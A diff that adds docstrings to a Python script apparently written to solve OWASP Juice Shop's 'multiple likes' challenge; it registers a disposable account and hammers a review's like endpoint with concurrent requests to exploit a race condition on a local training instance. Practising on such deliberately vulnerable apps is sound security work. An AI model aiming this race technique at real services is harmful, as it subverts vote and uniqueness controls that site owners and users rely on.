@@ -1,3 +1,4 @@
+"""Race a liking endpoint to solve the Juice Shop timing attack challenge."""
 import requests
 import concurrent.futures
 import time
@@ -8,9 +9,11 @@ import json
 BASE_URL = "http://localhost:3000"
 
 def random_string(length=8):
+    """Return a random lowercase alphanumeric string of the requested length."""
     return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
 def register_and_login():
+    """Create a disposable account and return its bearer token."""
     email = f"likes_{random_string()}@test.com"
     password = "password123"
     
@@ -40,6 +43,7 @@ def register_and_login():
         return None
 
 def get_target_review(token):
+    """Find or create a review to target for the like-race and return its ID."""
     headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
     
     # Get reviews for product 1
@@ -72,6 +76,7 @@ def get_target_review(token):
     return None
 
 def solve_multiple_likes():
+    """Exploit the multiple likes timing gap by hammering the like endpoint concurrently."""
     print("[*] Registering temporary user...")
     token = register_and_login()
     if not token:
@@ -87,6 +92,7 @@ def solve_multiple_likes():
     headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
     
     def send_like():
+        """Attempt to like the chosen review once."""
         try:
             # The challenge is to like the SAME review multiple times with the SAME user.
             r = requests.post(url, headers=headers, timeout=5)
